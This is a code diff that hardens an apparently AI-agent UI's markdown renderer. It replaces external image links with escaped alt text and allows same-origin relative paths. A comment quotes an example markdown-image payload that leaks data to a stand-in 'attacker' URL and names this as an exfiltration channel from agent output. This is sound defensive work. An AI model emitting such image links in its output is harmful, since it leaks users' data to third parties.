@@ -26,18 +26,28 @@ md.renderer.rules.link_open = (tokens, idx, options, env, self) => {
 // Глушение внешних markdown-картинок. `![](https://attacker/?leak)` — существующий
 // канал эксфильтрации из текста агента: браузер тянет внешний URL при рендере.
 // Экземпляр md общий для плана и ленты — обоим внешние картинки не нужны, поэтому
-// правим общий рендерер. Same-origin/относительные (src начинается с одного "/",
-// но не "//host") рендерятся как раньше; всё внешнее заменяется экранированным
-// alt-текстом, без <img>.
+// правим общий рендерер. Разрешаем ЛЮБУЮ same-origin относительную ссылку
+// (`/abs`, `./rel`, `rel/path`, `../x`) — такие рендерились и раньше; глушим
+// только то, что делает запрос на ЧУЖОЙ origin: явную схему (`http:`, `https:`,
+// `data:`, `javascript:` …) и protocol-relative `//host`. Внешнее заменяется
+// экранированным alt-текстом, без <img>.
 const renderImage =
   md.renderer.rules.image ??
   ((tokens, idx, options, _env, self) => self.renderToken(tokens, idx, options))
 
+// isSameOriginImageSrc — true для относительных/абсолютно-путевых ссылок того же
+// origin; false для protocol-relative (`//host`) и любой явной схемы (`scheme:`).
+function isSameOriginImageSrc(src: string): boolean {
+  if (src === '' || src.startsWith('//')) return false
+  // Явная схема вида `http:`, `data:`, `javascript:` — RFC3986 scheme-префикс.
+  if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(src)) return false
+  return true
+}
+
 md.renderer.rules.image = (tokens, idx, options, env, self) => {
   const token = tokens[idx]
   const src = token?.attrGet('src') ?? ''
-  const sameOrigin = src.startsWith('/') && !src.startsWith('//')
-  if (!sameOrigin) {
+  if (!isSameOriginImageSrc(src)) {
     return escapeHtml(token?.content ?? '')
   }
   return renderImage(tokens, idx, options, env, self)
